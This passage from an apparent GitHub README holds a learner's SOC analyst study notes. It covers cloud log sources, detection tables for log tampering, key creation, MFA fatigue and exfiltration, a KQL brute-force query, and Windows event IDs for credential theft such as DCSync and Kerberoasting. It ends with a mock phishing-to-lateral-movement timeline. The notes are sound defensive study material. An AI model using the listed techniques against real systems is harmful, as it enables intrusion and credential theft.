| Azure / Entra ID | Audit logs | Role, app, and user changes |
| Azure | Activity log | Resource-level (control plane) actions |
| Azure | Microsoft Sentinel / Defender for Cloud | SIEM and posture detections |
| AWS | CloudTrail | Every API call: who, what, when, from where |
| AWS | GuardDuty | Managed threat detection findings |
| AWS | VPC Flow Logs | Network traffic metadata |
| AWS | CloudWatch | Metrics, application logs, alarms |

**High-signal cloud detections**

| Behaviour | Why suspicious |
|-----------|----------------|
| Root account use / console login without MFA (AWS) | Root should be near-unused |
| `StopLogging` / `DeleteTrail` (CloudTrail) | Defense evasion |
| `CreateAccessKey`, `AttachUserPolicy`, new admin role | Persistence / privilege escalation |
| Impossible travel / sign-in from anonymising IP | Credential compromise |
| Many MFA push denials then success | MFA fatigue (T1621) |
| New inbox forwarding rule after risky sign-in | BEC |
| Public S3 bucket / storage container made public | Data exposure |
| Sudden large `GetObject` / download volume | Exfiltration |

**Sentinel (KQL) brute-force sample**
```kql
SigninLogs
| where TimeGenerated > ago(24h)
| where ResultType != 0
| summarize Failures=count(), Apps=dcount(AppDisplayName) by UserPrincipalName, IPAddress
| where Failures > 10
| sort by Failures desc
```

**CloudTrail triage questions:** which identity, which IP/user-agent, which API, from where, was MFA used, what resources were touched, is it normal for this identity?

**Response:** revoke sessions/keys, disable the identity, rotate credentials, review role assignments, check resource changes, preserve logs.

---

| Area | Must-know |
|------|-----------|
| Logons | 4624 / 4625 / 4672 / 4648 / 4634. Types 2, 3, 5, 10 |
| Persistence | 4698 (task), 7045 (service), Run keys. T1053.005, T1543.003, T1547.001 |
| Execution | 4688 parent-child red flags, PowerShell `-EncodedCommand`, `IEX` |
| Credential access | NTDS dump (T1003.003), DCSync (4662), Kerberoasting (4769 `0x17`) |
| Lateral movement | SMB/445, RDP/3389, Pass-the-Hash (4624 T3 NTLM) |
| Phishing | Headers, SPF/DKIM/DMARC, defang, scope, purge |
| Malware | Static (hash, strings, imports) → Dynamic (ProcMon, Sysmon, sandbox) |
| Hunting | Pyramid of Pain, IOC vs IOA |
| EDR | Process tree first; isolate on active C2/spread |
| Memory | `pslist` vs `psscan`, `malfind`, `netscan` |
| IR | NIST 4 phases, preserve before remediate, chain of custody |
| Cloud | CloudTrail `StopLogging`, Entra sign-in anomalies, MFA fatigue |

**Escalation formula (unchanged):** WHO → WHAT → WHEN → WHERE → IMPACT → DONE → NEED

**Final mock scenario: Multi-stage intrusion**
```
09:12  Phishing email delivered to finance user, macro-enabled attachment
09:15  4688: WINWORD.EXE -> powershell.exe -EncodedCommand ...
09:16  Sysmon 3: powershell.exe -> external IP :443 (beacon every 60s)
09:40  4624 Type 3: finance user -> FS01 using NTLM
09:52  4698 on FS01: scheduled task in C:\Users\Public
10:05  4769 RC4 burst from same user (Kerberoasting)
```
Expected L1 output: severity Critical, kill chain mapping (Delivery → Exploitation → Installation → C2 → lateral movement), MITRE mapping (T1566.001, T1059.001, T1027, T1071.001, T1021.002, T1053.005, T1558.003), EDR isolation of both hosts, perimeter block of the C2 IP, mailbox purge, credential reset, and a written escalation brief.

**Honest gap review (update with real findings):**
- Next steps: Splunk depth, EDR hands-on, Sentinel/KQL, CEH completion

---

## 🧰 Tools & Platforms

`Windows Event Viewer` `Wireshark` `Splunk` `Microsoft Sentinel`  
`MITRE ATT&CK Navigator` `TryHackMe` `LetsDefend` `Hack The Box`  
`AbuseIPDB` `VirusTotal` `EDR (CrowdStrike / Microsoft Defender)`  
`Sysmon` `Volatility 3` `PEStudio` `ANY.RUN`

---

## 🏆 Certifications Running Alongside

| Certification | Platform | Status |
|---------------|----------|--------|
| SOC Fundamentals | LetsDefend × HackTheBox | ✅ Completed |
| CEH | EC-Council | 🟡 In Progress |
| SOC Analyst Bootcamp (Self-directed) | GitHub | ✅ Completed — 20/20 |

---

## 📌 Related Projects

- [Web Application VAPT Report](https://github.com/AleenaRoseGeorge/web-application-pentest-report)
- [Cyber Forensics Internship](https://github.com/AleenaRoseGeorge/cyber-forensics-internship)

---

*Built in public. Updated daily. Every mistake documented.*
